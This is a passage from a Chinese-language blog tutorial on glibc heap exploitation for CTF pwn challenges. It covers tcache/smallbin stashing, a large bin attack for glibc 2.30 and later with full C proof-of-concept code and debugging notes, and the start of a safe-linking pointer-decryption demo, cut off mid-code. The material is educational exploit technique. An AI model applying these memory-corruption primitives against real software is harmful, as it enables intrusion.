                      alt="image-20231015140157626"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140331259.png"
                      alt="image-20231015140331259"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140509323.png"
                      alt="image-20231015140509323"
                ></p>
<p>申请 <code>9</code> 个 <code>0x90</code> 大小的 <code>chunk</code>，将 <code>3~8</code> 这 <code>6</code> 个 <code>chunk</code> 放进 <code>tcache</code> 中， 然后依次释放 <code>1,0,2</code> 三个 <code>chunk</code>，<code>1</code> 将会进入 <code>tcache</code> 中，<code>0,2</code> 进入 <code>unsorted</code>，因为不相邻，所以不会触发合并。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140538358.png"
                      alt="image-20231015140538358"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140650996.png"
                      alt="image-20231015140650996"
                ></p>
<p><code>malloc(0xa0)</code> 将会触发整理机制，将 <code>unsorted_bin</code> 中的 <code>chunk</code> 放进 <code>small_bin</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140716845.png"
                      alt="image-20231015140716845"
                ></p>
<p>接下来在 <code>tcache</code> 中腾出两个位置，为后续放入 <code>small_bin chunk</code> 做准备。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140815350.png"
                      alt="image-20231015140815350"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140838808.png"
                      alt="image-20231015140838808"
                ></p>
<p>将 <code>small_bin</code> 中倒数第二个 <code>chunk_bk</code> 指向 <code>stack_var</code>，为后续将 <code>chunk</code> 放入 <code>tcache</code> 中做索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141053095.png"
                      alt="image-20231015141053095"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141310006.png"
                      alt="image-20231015141310006"
                ></p>
<p>利用 <code>calloc(1,0x90)</code> 将 <code>small_bin</code> 中最后一个 <code>chunk</code> 拿出来，然后触发整理机制，将 <code>small_bin</code> 中剩余的 <code>chunk</code> 倒序取出放入 <code>tcache</code>，也就是按 <code>bk</code> 去索引。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141338609.png"
                      alt="image-20231015141338609"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141353825.png"
                      alt="image-20231015141353825"
                ></p>
<p>此时再次申请将会把目标地址的<code>fake_chunk</code>申请出来。</p>
<h1 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h1><h2 id="large-bin-attack-glibc-2-29"><a href="#large-bin-attack-glibc-2-29" class="headerlink" title="large_bin_attack (glibc &gt; 2.29)"></a>large_bin_attack (glibc &gt; 2.29)</h2><p>本次使用 <code>ubuntu:20.04</code> 。</p>
<h3 id="源码-24"><a href="#源码-24" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><p><code>glibc-2.30</code> 新增了两道检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// largebin_chunk-&gt;bk_nextsize-&gt;fd_nextszie != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="comment">// largebin_chunk-&gt;bk-&gt;fd != largebin_chunk</span></span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">	<span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>利用代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-24"><a href="#调试-24" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015202953631.png"
                      alt="image-20231015202953631"
                ></p>
<p>布置堆结构如上，图中从上到下<code>chunk</code>分别为 <code>p1, g1, p2, g2</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203107725.png"
                      alt="image-20231015203107725"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203416086.png"
                      alt="image-20231015203416086"
                ></p>
<p>将 <code>chunk_p1</code> 放进 <code>largebin</code>，将 <code>chunk_p2</code> 放进 <code>unsorted_bin</code>，<code>(largebin)p1_size &gt; (unsorted)p2_size</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203720711.png"
                      alt="image-20231015203720711"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203842452.png"
                      alt="image-20231015203842452"
                ></p>
<p>修改<code>p1_bk_nextsize = target-0x20</code>，也就是<code>fake_chunk_fd_nextsize</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204330313.png"
                      alt="image-20231015204330313"
                ></p>
<p>然后申请 <code>0x438</code> 大小的 <code>chunk</code>，触发整理机制将 <code>chunk_p2</code> 链接进 <code>largebin</code>，因为 <code>p2_size &lt; (largebin_least)p1</code>，会触发如下代码。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// victim:p2, fwd:largebin表头, bck:largebin_least_chunk(p1)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) <span class="built_in">chunksize_nomask</span> (bck-&gt;bk)) &#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk; </span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><p><code>p2-&gt;fd_nextsize = p1; </code></p>
</li>
<li><p><code>p2-&gt;bk_nextsize = (target-0x20)p1-&gt;bk_nextsize;</code></p>
</li>
<li><p><code>(target-0x20)p1-&gt;bk_nextsize = p2;</code></p>
</li>
</ol>
<p> 第三步时将 <code>(target)fake_chunk_fd_nextsize</code> 改为了 <code>p2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204706099.png"
                      alt="image-20231015204706099"
                ></p>
<p>最后目标地址被成功修改为一个堆地址。</p>
<h2 id="decrypt-safe-linking-glibc-2-31"><a href="#decrypt-safe-linking-glibc-2-31" class="headerlink" title="decrypt_safe_linking(glibc &gt; 2.31)"></a>decrypt_safe_linking(glibc &gt; 2.31)</h2><p>本次使用 <code>ubuntu:22.04</code> 进行编译。</p>
<h3 id="源码-25"><a href="#源码-25" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">decrypt</span><span class="params">(<span class="type">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line">	<span class="type">long</span> key = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> plain;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">		<span class="type">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line">		<span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">		plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">		key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment">	 * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment">	 * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment">	 * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment">	 * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment">	 * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment">	 * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment">	 * and the pointer. What we demonstrate here is a special case whose page-offset is 0.</span></span><br><span class="line"><span class="comment">	 * For demonstrations of other more general cases, plz refer to</span></span><br><span class="line"><span class="comment">	 * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 1: allocate chunks</span></span><br><span class="line">	<span class="type">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="type">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// step 2: free chunks</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span 